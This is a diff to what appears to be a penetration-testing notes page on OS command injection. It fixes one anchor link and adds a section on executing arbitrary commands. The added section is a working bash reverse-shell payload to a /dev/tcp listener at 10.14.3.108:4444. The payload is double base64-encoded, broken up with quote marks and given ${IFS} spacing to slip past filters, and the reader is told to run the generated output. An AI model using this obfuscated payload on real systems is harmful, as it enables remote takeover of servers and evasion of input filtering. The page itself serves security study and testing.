@@ -4,7 +4,7 @@
 
 OS command injection (also known as shell injection) is a web security flaw that allows an attacker to run arbitrary operating system (OS) commands on the server that is hosting an application, compromising the program and all of its data.
 
-### Useful commands <a href="useful-commands" id="useful-commands"></a>
+### Useful commands <a href="#useful-commands" id="useful-commands"></a>
 
 When you've discovered an OS command injection vulnerability, it's always a good idea to run a few test commands to learn more about the system you've infiltrated. The following is a list of commands that can be used on both Linux and Windows platforms:
 
@@ -41,4 +41,10 @@ In the original command, the input that you control may appear within quote mark
 
 ## Executing arbitrary commands
 
-\
+Bash reverse shell example:
+
+```bash
+echo "echo $(echo 'bash -i >& /dev/tcp/10.14.3.108/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+```
+
+Now execute the generate output of the command above and try to execute it.\
